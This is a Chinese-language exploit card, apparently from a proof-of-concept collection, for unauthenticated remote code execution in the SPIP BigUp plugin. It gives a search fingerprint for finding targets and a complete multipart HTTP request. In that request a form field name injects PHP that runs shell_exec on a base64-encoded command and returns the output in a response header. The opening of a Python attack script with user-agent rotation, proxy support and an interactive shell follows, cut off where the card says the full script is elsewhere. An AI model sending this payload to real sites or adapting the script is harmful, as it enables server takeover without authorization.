# SPIPBigUp未授权远程代码执行漏洞

- **系统**：SPIPBigUp　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="SPIP Blog"`
- **请求**：`POST / HTTP/2`
- **关键头**：`Content-Type: multipart/form-data; boundary=jBc9tge4JtkyKqLk`　`Content-Length: 664`

**请求体 / payload**
```
--jBc9tge4JtkyKqLk
Content-Disposition: form-data; name="formulaire\_action"
login
--jBc9tge4JtkyKqLk
Content-Disposition: form-data; name="bigup\_retrouver\_fichiers"
1
--jBc9tge4JtkyKqLk
Content-Disposition: form-data; name="oAkq\[' . header("X-Command-Output: " . base64\_encode(shell\_exec(base64\_decode("aWQ=")))) . die() . ']"; filename="JwrK"
Content-Type: text/plain
Contenu du fichier!
--jBc9tge4JtkyKqLk
Content-Disposition: form-data; name="formulaire\_action\_args"
XvgjTQWys2NedplkOiCxRgNly7BDGAHWN9vv7/la9KiGKjxIBam8Z/K0ppqKixdte4PQdY9QphDihEJD7TO/k+HWDUG+ZTDgxeEsMR+wX3eYBpL7l/lXicIKqzxhH8erqx2+eO94rAK7GlOYjQ==
--jBc9tge4JtkyKqLk--
import sys
import base64
import random
import string
import requests
import concurrent.futures
import rich\_click as click
from bs4 import BeautifulSoup
from urllib.parse import urlparse
from alive\_progress import alive\_bar
from prompt\_toolkit import PromptSession, HTML
from prompt\_toolkit.history import InMemoryHistory
from random\_user\_agent.user\_agent import UserAgent
from random\_user\_agent.params import SoftwareName, OperatingSystem
requests.packages.urllib3.disable\_warnings()
class SpipBigUp:
def **init**(self, base\_url, verbose=True, proxy=None):
self.base\_url = base\_url
self.proxies = {"http": proxy, "https": proxy} if proxy else None
self.verbose = verbose
software\_names = \[SoftwareName.CHROME.value, SoftwareName.FIREFOX.value]
operating\_systems = \[
OperatingSystem.WINDOWS.value,
OperatingSystem.LINUX.value,
Operati…（脚本共 8015 字，完整版见原文）
```
- **预期**：200　|　—